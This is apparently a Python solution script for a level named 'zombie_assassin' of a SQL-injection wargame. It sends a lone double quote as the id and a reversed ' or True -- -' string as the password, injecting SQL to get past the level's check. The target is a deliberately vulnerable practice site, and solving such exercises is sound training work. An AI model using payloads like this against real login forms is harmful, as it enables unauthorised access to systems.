from constants import *

chall_url = "https://los.rubiya.kr/chall/zombie_assassin_eac7521e07fe5f298301a44b61ffeec0.php"

res = make_request(chall_url, "?id=" + urllib.parse.quote("\"") + "&pw=" + urllib.parse.quote(" or True -- -"[::-1]))
check_clear(res)
